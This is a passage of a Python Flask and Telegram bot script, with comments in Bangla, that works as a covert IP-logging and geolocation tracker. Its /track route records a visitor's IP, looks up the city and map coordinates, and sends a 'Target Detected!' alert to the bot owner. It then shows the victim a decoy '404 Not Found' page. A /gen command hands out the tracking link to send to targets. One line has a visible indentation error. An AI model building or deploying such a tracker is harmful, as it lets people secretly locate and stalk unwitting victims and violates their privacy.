# --- ৩. ট্র্যাকিং পেজ ---
@app.route('/track')
def track_user():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    g = geocoder.ip(user_ip)
    lat_lng = g.latlng if g.latlng else [0, 0]
    location_info = f"{g.city}, {g.country}" if g.city else "অজানা লোকেশন"
    
    map_link = f"https://www.google.com/maps?q={lat_lng[0]},{lat_lng[1]}"
    
    alert = (
        "⚠️ **Target Detected!** ⚠️\n\n"
        f"🌐 **IP:** `{user_ip}`\n"
        f"📍 **Location:** {location_info}\n"
        f"🗺️ **Maps:** [Open Map]({map_link})"
    )
    
    if ADMIN_ID:
        bot.send_message(ADMIN_ID, alert, parse_mode="Markdown")
    
    return "<h1>404 Not Found</h1>"

# --- ৪. ওয়েলকাম লিস্ট ও বাটন সিস্টেম ---
@bot.message_handler(commands=['start'])
def welcome_list(message):
    global ADMIN_ID
    
    # অ্যাডমিন আইডি সেট করা
    if message.from_user.username == ADMIN_USERNAME:
        ADMIN_ID = message.chat.id

    # বাটন তৈরি
    markup = types.InlineKeyboardMarkup()
    owner_btn = types.InlineKeyboardButton(text="👤 BOT OWNER: ENAFUL", url=f"https://t.me/{ADMIN_USERNAME}")
    markup.add(owner_btn)

        welcome_text = (
        "👋 **Welcome to Cyber.71.ENAFUL Bot**\n\n"
        "🛠 **Status:** Active\n"
        f"👑 **Owner:** Boss Enaful\n"
        f"🆔 **Username:** @{ADMIN_USERNAME}\n\n"
        "নিচের বাটনে ক্লিক করে সরাসরি আমার আইডিতে যোগাযোগ করতে পারেন।"
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(commands=['gen'])
def generate_link(message):
    if message.chat.id == ADMIN_ID:
        bot.reply_to(message, f"🔗 Your Link: `{SERVER_URL}/track`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "Access Denied!")

def run_flask():
    app.run(host='0.0.0.0', port=5000, use_reloader=False)

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    print("বট সচল হয়েছে...")
    bot.infinity_polling()

